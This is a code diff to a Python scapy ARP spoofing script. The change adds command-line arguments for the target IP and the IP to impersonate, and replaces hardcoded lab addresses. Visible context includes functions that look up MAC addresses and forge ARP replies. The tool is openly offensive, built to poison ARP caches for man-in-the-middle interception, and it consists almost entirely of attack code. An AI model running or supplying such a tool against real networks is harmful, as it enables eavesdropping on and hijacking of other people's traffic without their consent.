@@ -1,6 +1,16 @@
 # ARP SPOOFER
 import scapy.all as scapy
 import time
+import argparse
+
+def args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-t','--target', dest='tip', help='IP TO TARGET THE ATTACK')
+    parser.add_argument('-s','-spoof', dest='sip', help='IP TO SPOOF')
+    (val) =  parser.parse_args()
+    if not val.tip or not val.sip:
+        parser.error('INVALID ARGS, USE --help')
+    return val
 
 def gmac(ip):
     arpreq = scapy.ARP(pdst=ip)
@@ -21,8 +31,10 @@ def rest(dstip, srcip):
     pacc = scapy.ARP(op=2, pdst=dstip, hwdst=dstmac, psrc=srcip)
     scapy.send(pacc, count=4, verbose=False)
 
-tip = '10.0.2.15' #add arguments in a sec .drinking 
-sip = '10.0.2.1' # OH NO THIS IS A DRAGON
+#tip = '10.0.2.4' #ADD ARGS 
+#sip = '10.0.2.1'
+
+val = args()
 
 try:
     pacccnt = 0
